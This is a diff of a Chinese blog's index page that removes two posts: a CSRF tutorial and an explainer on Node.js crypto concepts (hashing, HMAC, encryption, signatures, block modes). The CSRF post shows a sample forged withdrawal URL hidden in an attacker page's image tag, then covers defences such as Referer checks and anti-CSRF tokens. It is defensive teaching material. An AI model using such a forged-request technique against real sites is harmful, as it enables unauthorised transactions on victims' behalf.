-      
-      
-  
-    <h1 class="title"><a href="/2017/02/16/网络安全/CSRF攻击及预防/">CSRF攻击及预防</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><p>CSRF（Cross-Site Request Forgery，跨站点伪造请求，也被称为：one click attack/session riding，缩写为：CSRF/XSRF）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
-<h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>下图简单阐述了CSRF的原理:</p>
-<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/csrf.jpg" alt=""></p>
-<p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成以下两个步骤：</p>
-<ul>
-<li>登录受信任网站A，并在本地生成Cookie。</li>
-<li>在不登出A的情况下，访问危险网站B。</li>
-</ul>
-<p>看到这里，你也许会问：“如果我不满足以上两个条件中的一个，我就不会受到CSRF攻击”。是滴，确实如此，但是你不能保证以下情况不会发生：</p>
-<ul>
-<li>你不能保证你登录了一个网站之后，不再打开一个tab页面并访问其它的网站。</li>
-<li>你不能保证你关闭浏览器之后，你本地的Cookie立刻过期，你上次的会话已经结束。</li>
-<li>上述中所谓的攻击网站，可能就是一个钓鱼网站。</li>
-</ul>
-<h2 id="CSRF攻击实例"><a href="#CSRF攻击实例" class="headerlink" title="CSRF攻击实例"></a>CSRF攻击实例</h2><p>CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。</p>
-<h2 id="CSRF如何防御"><a href="#CSRF如何防御" class="headerlink" title="CSRF如何防御"></a>CSRF如何防御</h2><h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
-<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
-<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
-<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
-<h3 id="添加token验证"><a href="#添加token验证" class="headerlink" title="添加token验证"></a>添加token验证</h3><p>CSRF攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都存在cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的cookie来通过安全验证。要防止CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie之中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。<br> 现在业界一致的做法就是使用Anti CSRF Token来防御CSRF。</p>
-<ul>
-<li>用户访问某个表单页面。</li>
-<li>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</li>
-<li>在页面表单附带上Token参数。</li>
-<li>用户提交请求后，服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</li>
-</ul>
-<p>这个Token值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token应注意Token的保密性，尽量把敏感操作由GET改成POST，以form或者AJAX形式提交，避免Token泄露。</p>
-<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码，强制用户必须与应用进行交互，才能完成最终请求。通常情况下，验证码能够很好的遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段。</p>
-<h3 id="尽量使用POST，限制GET"><a href="#尽量使用POST，限制GET" class="headerlink" title="尽量使用POST，限制GET"></a>尽量使用POST，限制GET</h3><p>GET接口能够直接将请求地址暴露给攻击者，所以要防止CSRF一定最好不要用GET。当然POST并不是万无一失，攻击者只需要构造一个form表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。</p>
-<h3 id="在HTTP头部添加自定义属性"><a href="#在HTTP头部添加自定义属性" class="headerlink" title="在HTTP头部添加自定义属性"></a>在HTTP头部添加自定义属性</h3><p>这种方法也是使用token并验证，但是它是把token放在HTTP请求头部中。通过使用AJAX我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。</p>
-<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/cxying93/p/6035031.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxying93/p/6035031.html</a><br><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html</a><br><a href="https://www.imooc.com/article/18069" target="_blank" rel="noopener">https://www.imooc.com/article/18069</a></p>
-
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-12T06:45:23.000Z"><a href="/2017/02/12/网络安全/Node.js中crypto模块/">2017-02-12</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/02/12/网络安全/Node.js中crypto模块/">Node.js中的crypto模块</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h2 id="一、-概述"><a href="#一、-概述" class="headerlink" title="一、 概述"></a>一、 概述</h2><p>互联网时代，网络上的数据量每天都在以惊人的速度增长。同时，各类网络安全问题层出不穷。在信息安全重要性日益凸显的今天，作为一名开发者，需要加强对安全的认识，并通过技术手段增强服务的安全性。</p>
-<p><code>crypto</code>模块是nodejs的核心模块之一，它提供了安全相关的功能，如摘要运算、加密、电子签名等。很多初学者对着长长的API列表，不知如何上手，因此它背后涉及了大量安全领域的知识。</p>
-<p>本文重点讲解API背后的理论知识，主要包括如下内容：</p>
-<ol>
-<li>摘要（hash）、基于摘要的消息验证码（HMAC）</li>
-<li>对称加密、非对称加密、电子签名</li>
-<li>分组加密模式</li>
-</ol>
-<h2 id="二、摘要（hash）"><a href="#二、摘要（hash）" class="headerlink" title="二、摘要（hash）"></a>二、摘要（hash）</h2><p>摘要（digest）：将长度不固定的消息作为输入，通过运行hash函数，生成固定长度的输出，这段输出就叫做摘要。通常用来验证消息完整、未被篡改。</p>
-<p>摘要运算是不可逆的。也就是说，输入固定的情况下，产生固定的输出。但知道输出的情况下，无法反推出输入。</p>
-<p>伪代码如下。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">digest = Hash(message)</span><br></pre></td></tr></table></figure></p>
-<p>常见的摘要算法 与 对应的输出位数如下：</p>
-<ul>
-<li>MD5：128位</li>
-<li>SHA-1：160位</li>
-<li>SHA256 ：256位</li>
-<li>SHA512：512位</li>
-</ul>
-<p>nodejs中的例子：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> md5 = crypto.createHash(<span class="string">'md5'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> message = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">var</span> digest = md5.update(message, <span class="string">'utf8'</span>).digest(<span class="string">'hex'</span>); </span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(digest);</span><br><span class="line"><span class="comment">// 输出如下：注意这里是16进制</span></span><br><span class="line"><span class="comment">// 5d41402abc4b2a76b9719d911017c592</span></span><br></pre></td></tr></table></figure>
-<p>备注：在各类文章或文献中，摘要、hash、散列 这几个词经常会混用，导致不少初学者看了一脸懵逼，其实大部分时候指的都是一回事，记住上面对摘要的定义就好了。</p>
-<h2 id="三、MAC、HMAC"><a href="#三、MAC、HMAC" class="headerlink" title="三、MAC、HMAC"></a>三、MAC、HMAC</h2><p>MAC（Message Authentication Code）：消息认证码，用以保证数据的完整性。运算结果取决于消息本身、秘钥。</p>
-<p>MAC可以有多种不同的实现方式，比如HMAC。</p>
-<p>HMAC（Hash-based Message Authentication Code）：可以粗略地理解为带秘钥的hash函数。</p>
-<p>nodejs例子如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数一：摘要函数</span></span><br><span class="line"><span class="comment">// 参数二：秘钥</span></span><br><span class="line"><span class="keyword">let</span> hmac = crypto.createHmac(<span class="string">'md5'</span>, <span class="string">'123456'</span>);</span><br><span class="line"><span class="keyword">let</span> ret = hmac.update(<span class="string">'hello'</span>).digest(<span class="string">'hex'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ret);</span><br><span class="line"><span class="comment">// 9c699d7af73a49247a239cb0dd2f8139</span></span><br></pre></td></tr></table></figure>
-<h2 id="四、对称加密、非对称加密"><a href="#四、对称加密、非对称加密" class="headerlink" title="四、对称加密、非对称加密"></a>四、对称加密、非对称加密</h2><p><strong>加密/解密</strong>：给定明文，通过一定的算法，产生加密后的密文，这个过程叫加密。反过来就是解密。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt( plainText )</span><br><span class="line">plainText = decrypt( encryptedText )</span><br></pre></td></tr></table></figure></p>
-<p><strong>秘钥</strong>：为了进一步增强加/解密算法的安全性，在加/解密的过程中引入了秘钥。秘钥可以视为加/解密算法的参数，在已知密文的情况下，如果不知道解密所用的秘钥，则无法将密文解开。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, encryptKey)</span><br><span class="line">plainText = decrypt(encryptedText, decryptKey)</span><br></pre></td></tr></table></figure></p>
-<p>根据加密、解密所用的秘钥是否相同，可以将加密算法分为<strong>对称加密</strong>、<strong>非对称加密</strong>。</p>
-<h3 id="1、对称加密"><a href="#1、对称加密" class="headerlink" title="1、对称加密"></a>1、对称加密</h3><p>加密、解密所用的秘钥是相同的，即<code>encryptKey === decryptKey</code>。</p>
-<p>常见的对称加密算法：DES、3DES、AES、Blowfish、RC5、IDEA。</p>
-<p>加、解密伪代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, key); <span class="comment">// 加密</span></span><br><span class="line">plainText = decrypt(encryptedText, key); <span class="comment">// 解密</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2、非对称加密"><a href="#2、非对称加密" class="headerlink" title="2、非对称加密"></a>2、非对称加密</h3><p>又称公开秘钥加密。加密、解密所用的秘钥是不同的，即<code>encryptKey !== decryptKey</code>。</p>
-<p>加密秘钥公开，称为公钥。解密秘钥保密，称为秘钥。</p>
-<p>常见的非对称加密算法：RSA、DSA、ElGamal。</p>
-<p>加、解密伪代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, publicKey);  <span class="comment">// 加密</span></span><br><span class="line">plainText = decrypt(encryptedText, priviteKey); <span class="comment">// 解密</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="3、对比与应用"><a href="#3、对比与应用" class="headerlink" title="3、对比与应用"></a>3、对比与应用</h3><p>除了秘钥的差异，还有运算速度上的差异。通常来说：</p>
-<ol>
-<li>对称加密速度要快于非对称加密。</li>
-<li>非对称加密通常用于加密短文本，对称加密通常用于加密长文本。</li>
-</ol>
-<p>两者可以结合起来使用，比如HTTPS协议，可以在握手阶段，通过RSA来交换生成对称秘钥。在之后的通讯阶段，可以使用对称加密算法对数据进行加密，秘钥则是握手阶段生成的。 </p>
-<p>备注：对称秘钥交换不一定通过RSA，还可以通过类似DH来完成，这里不展开。</p>
-<h2 id="五、数字签名"><a href="#五、数字签名" class="headerlink" title="五、数字签名"></a>五、数字签名</h2><p>从<strong>签名</strong>大致可以猜到<strong>数字签名</strong>的用途。主要作用如下：</p>
-<ol>
-<li>确认信息来源于特定的主体。</li>
-<li>确认信息完整、未被篡改。</li>
-</ol>
-<p>为了达到上述目的，需要有两个过程：</p>
-<ol>
-<li>发送方：生成签名。</li>
-<li>接收方：验证签名。</li>
-</ol>
-<h3 id="1、发送方生成签名"><a href="#1、发送方生成签名" class="headerlink" title="1、发送方生成签名"></a>1、发送方生成签名</h3><ol>
-<li>计算原始信息的摘要。</li>
-<li>通过私钥对摘要进行签名，得到电子签名。</li>
-<li>将原始信息、电子签名，发送给接收方。</li>
-</ol>
-<p>附：签名伪代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">digest = hash(message); <span class="comment">// 计算摘要</span></span><br><span class="line">digitalSignature = sign(digest,  priviteKey); <span class="comment">// 计算数字签名</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2、接收方验证签名"><a href="#2、接收方验证签名" class="headerlink" title="2、接收方验证签名"></a>2、接收方验证签名</h3><ol>
-<li>通过公钥解开电子签名，得到摘要D1。（如果解不开，信息来源主体校验失败）</li>
-<li>计算原始信息的摘要D2。</li>
-<li>对比D1、D2，如果D1等于D2，说明原始信息完整、未被篡改。</li>
-</ol>
-<p>附：签名验证伪代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">digest1 = verify(digitalSignature, publicKey); <span class="comment">// 获取摘要</span></span><br><span class="line">digest2 = hash(message); <span class="comment">// 计算原始信息的摘要</span></span><br><span class="line">digest1 === digest2      <span class="comment">// 验证是否相等</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="3、对比非对称加密"><a href="#3、对比非对称加密" class="headerlink" title="3、对比非对称加密"></a>3、对比非对称加密</h3><p>由于RSA算法的特殊性，加密/解密、签名/验证 看上去特别像，很多同学都很容易混淆。先记住下面结论，后面有时间再详细介绍。</p>
-<ol>
-<li>加密/解密：公钥加密，私钥解密。</li>
-<li>签名/验证：私钥签名，公钥验证。</li>
-</ol>
-<h2 id="六、分组加密模式、填充、初始化向量"><a href="#六、分组加密模式、填充、初始化向量" class="headerlink" title="六、分组加密模式、填充、初始化向量"></a>六、分组加密模式、填充、初始化向量</h2><p>常见的对称加密算法，如AES、DES都采用了分组加密模式。这其中，有三个关键的概念需要掌握：模式、填充、初始化向量。</p>
-<p>搞清楚这三点，才会知道crypto模块对称加密API的参数代表什么含义，出了错知道如何去排查。</p>
-<h3 id="1、分组加密模式"><a href="#1、分组加密模式" class="headerlink" title="1、分组加密模式"></a>1、分组加密模式</h3><p>所谓的分组加密，就是将（较长的）明文拆分成固定长度的块，然后对拆分的块按照特定的模式进行加密。</p>
-<p>常见的分组加密模式有：ECB（不安全）、CBC（最常用）、CFB、OFB、CTR等。</p>
-<p>以最简单的ECB为例，先将消息拆分成等分的模块，然后利用秘钥进行加密。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-ECB_encryption.svg.png" alt=""><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-ECB_decryption.svg.png" alt=""><br>更多关于分组加密模式的介绍可以参考 <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Common_modes" target="_blank" rel="noopener">wiki</a>。</p>
-<p>后面假设每个块的长度为128位</p>
-<h3 id="2、初始化向量：IV"><a href="#2、初始化向量：IV" class="headerlink" title="2、初始化向量：IV"></a>2、初始化向量：IV</h3><p>为了增强算法的安全性，部分分组加密模式（CFB、OFB、CTR）中引入了初始化向量（IV），使得加密的结果随机化。也就是说，对于同一段明文，IV不同，加密的结果不同。</p>
-<p>以CBC为例，每一个数据块，都与前一个加密块进行亦或运算后，再进行加密。对于第一个数据块，则是与IV进行亦或。</p>
-<p>IV的大小跟数据块的大小有关（128位），跟秘钥的长度无关。<br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-CBC_encryption.svg.png" alt=""><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/601px-CBC_decryption.svg.png" alt=""></p>
-<h3 id="3、填充：padding"><a href="#3、填充：padding" class="headerlink" title="3、填充：padding"></a>3、填充：padding</h3><p>分组加密模式需要对长度固定的块进行加密。分组拆分完后，最后一个数据块长度可能小于128位，此时需要进行填充以满足长度要求。</p>
-<p>填充方式有多重。常见的填充方式有<a href="https://tools.ietf.org/html/rfc5652#section-6.3" target="_blank" rel="noopener">PKCS7</a>。</p>
-<p>假设分组长度为k字节，最后一个分组长度为k-last，可以看到：</p>
-<ol>
-<li>不管明文长度是多少，加密之前都会会对明文进行填充 （不然解密函数无法区分最后一个分组是否被填充了，因为存在最后一个分组长度刚好等于k的情况）</li>
-<li>如果最后一个分组长度等于k-last === k，那么填充内容为一个完整的分组 k k k … k （k个字节）</li>
-<li>如果最后一个分组长度小于k-last &lt; k，那么填充内容为 k-last mod k </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">         01 -- if lth mod k = k-1</span><br><span class="line">      02 02 -- if lth mod k = k-2</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">          .</span><br><span class="line">k k ... k k -- if lth mod k = 0</span><br></pre></td></tr></table></figure>
-<h3 id="概括来说"><a href="#概括来说" class="headerlink" title="概括来说"></a>概括来说</h3><ol>
-<li>分组加密：先将明文切分成固定长度的块（128位），再进行加密。</li>
-<li>分组加密的几种模式：ECB（不安全）、CBC（最常用）、CFB、OFB、CTR。</li>
-<li>填充(padding)：部分加密模式，当最后一个块的长度小于128位时，需要通过特定的方式进行填充。（ECB、CBC需要填充，CFB、OFB、CTR不需要填充）</li>
-<li>初始化向量（IV）：部分加密模式（CFB、OFB、CTR）会将 明文块 与 前一个密文块进行亦或操作。对于第一个明文块，不存在前一个密文块，因此需要提供初始化向量IV（把IV当做第一个明文块 之前的 密文块）。此外，IV也可以让加密结果随机化。</li>
-</ol>
-<h2 id="七、相关链接"><a href="#七、相关链接" class="headerlink" title="七、相关链接"></a>七、相关链接</h2><p><a href="https://github.com/chyingp/nodejs-learning-guide" target="_blank" rel="noopener">Nodejs学习笔记</a></p>
-<p><a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function" target="_blank" rel="noopener">Cryptographic hash function</a></p>
-<p><a href="https://en.wikipedia.org/wiki/Hash-based_message_authentication_code" target="_blank" rel="noopener">Hash-based message authentication code</a></p>
-<p><a href="https://crypto.stackexchange.com/questions/2936/hmac-vs-mac-functions" target="_blank" rel="noopener">HMAC vs MAC functions</a></p>
-<p><a href="https://crypto.stackexchange.com/questions/6523/what-is-the-difference-between-mac-and-hmac" target="_blank" rel="noopener">What is the difference between MAC and HMAC?</a></p>
-<p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener">Block cipher mode of operation</a></p>
-<p><a href="https://www.zhihu.com/question/25912483/answer/31653639" target="_blank" rel="noopener">RSA的公钥和私钥到底哪个才是用来加密和哪个用来解密？ - 刘巍然-学酥的回答 - 知乎</a></p>
-<h4 id="原文：https-www-cnblogs-com-chyingp-p-nodejs-learning-crypto-theory-html"><a href="#原文：https-www-cnblogs-com-chyingp-p-nodejs-learning-crypto-theory-html" class="headerlink" title="原文：https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html"></a>原文：<a href="https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html</a></h4>
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
 
 <nav id="pagination">
   
@@ -1222,13 +1190,13 @@
   
     <li><a href="/tags/Gulp/">Gulp</a><small>4</small></li>
   
-    <li><a href="/tags/Linux性能优化/">Linux性能优化</a><small>2</small></li>
+    <li><a href="/tags/Linux性能优化/">Linux性能优化</a><small>4</small></li>
   
     <li><a href="/tags/MongoDB/">MongoDB</a><small>2</small></li>
   
     <li><a href="/tags/Mongoose/">Mongoose</a><small>6</small></li>
   
-    <li><a href="/tags/MySQL实战/">MySQL实战</a><small>3</small></li>
+    <li><a href="/tags/MySQL实战/">MySQL实战</a><small>4</small></li>
   
     <li><a href="/tags/Node-js-IO/">Node.js_IO</a><small>4</small></li>
   
